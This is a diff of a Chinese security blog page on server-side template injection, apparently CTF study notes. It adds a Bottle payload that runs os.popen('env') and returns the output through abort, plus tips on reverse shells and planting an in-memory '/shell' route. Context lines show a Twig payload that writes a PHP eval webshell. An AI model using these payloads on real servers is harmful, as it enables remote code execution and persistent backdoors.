@@ -19,17 +19,17 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行bottle文档 twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_sel">
+    <meta name="description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行, 但无回显，可以反弹shell或者打内存马通过abort可以直接回显 1%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())  bottle文档 bottle模板注入以及">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI模版注入">
 <meta property="og:url" content="http://mekrina.github.io/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行bottle文档 twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_sel">
+<meta property="og:description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行, 但无回显，可以反弹shell或者打内存马通过abort可以直接回显 1%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())  bottle文档 bottle模板注入以及">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
 <meta property="og:image" content="http://mekrina.github.io/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-11T14:11:58.756Z">
+<meta property="article:modified_time" content="2025-03-23T06:44:29.559Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          910 字
+          1k 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          8 分钟
+          9 分钟
         
       </span>
     
@@ -279,7 +279,16 @@
               <div class="markdown-body">
                 
                 <p><img src="/blogs/images/SSTI.png" srcset="/blogs/img/loading.gif" lazyload alt="SSTI"></p>
-<p>另外，bottle 可以直接通过 <code>% python—code </code>或 <code>&lt;% %&gt;</code>执行<br><img src="/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png" srcset="/blogs/img/loading.gif" lazyload alt="bottle嵌入python代码"><br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">bottle文档</a></p>
+<p>另外，bottle 可以直接通过 <code>% python—code </code>或 <code>&lt;% %&gt;</code>执行, 但无回显，可以反弹shell或者打内存马<br>通过abort可以直接回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())<br></code></pre></td></tr></table></figure>
+
+<p><img src="/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png" srcset="/blogs/img/loading.gif" lazyload alt="bottle嵌入python代码"><br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">bottle文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16942">bottle模板注入以及内存马</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4048">bottle内存马</a></p>
+<p>需要注意原来的app是怎么运行的，<br>方式1：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">app = bottle.Bottle()<br>app.run<br></code></pre></td></tr></table></figure>
+<p>这时直接app.route(“&#x2F;shell”,”GET”,lambda:…)<br>也可以app.add_hook(…)<br>方式2：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">bottle.run<br></code></pre></td></tr></table></figure>
+<p>这时直接bottle.route修改路由可行<br>但是没有add_hook, 想执行bottle.Bottle().add_hook能执行,但是没有效果</p>
 <h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p>
 <ol>
 <li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li>
